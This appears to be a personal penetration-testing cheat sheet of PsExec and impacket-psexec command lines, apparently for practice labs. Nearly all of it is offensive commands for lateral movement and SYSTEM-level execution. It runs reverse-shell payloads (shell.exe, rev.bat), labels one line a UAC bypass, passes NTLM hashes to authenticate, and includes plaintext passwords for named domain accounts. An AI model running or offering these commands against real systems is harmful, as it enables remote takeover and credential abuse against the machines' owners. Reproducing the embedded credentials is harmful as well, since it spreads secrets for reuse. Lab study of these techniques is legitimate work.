


```
.\psexec64.exe -i -accepteula -d -s C:\\programdata\\shell.exe
```
(shell.exe -> rev shell payload)

```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

```
psexec.py domainadmin@TARGET -hashes aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7
```



UAC bypass ->

```
.\PsExec.exe -i -s "C:\temp\rev.bat"
```

![[Pasted image 20240727221853.png]]

```
psexec -i -s cmd.exe
```

```
impacket-psexec hutch.offsec/administrator:'1K#J}vjcK4&m%p'@TARGET
```

```
sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip TARGET
```

```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@TARGET
```

```
PsExec.exe \\dc1 cmd.exe
```

```
.\PsExec.exe \\files04 cmd
```

